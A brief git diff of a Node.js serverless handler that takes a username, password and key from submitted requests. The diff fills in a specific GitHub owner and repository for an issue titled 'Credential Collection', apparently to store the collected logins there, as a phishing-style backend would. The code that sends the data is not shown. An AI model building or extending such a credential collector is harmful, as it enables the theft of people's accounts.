@@ -28,8 +28,8 @@ module.exports = async (req, res) => {
     const { username, password, key } = req.body;
     
     // Your GitHub repository information
-    const owner = 'your-username'; // Replace with your GitHub username
-    const repo = 'your-repository'; // Replace with your repository name
+    const owner = 'ZA3MA3'; // Replace with your GitHub username
+    const repo = 'progres'; // Replace with your repository name
     const issueTitle = "Credential Collection";
     
     // First, check if the issue already exists
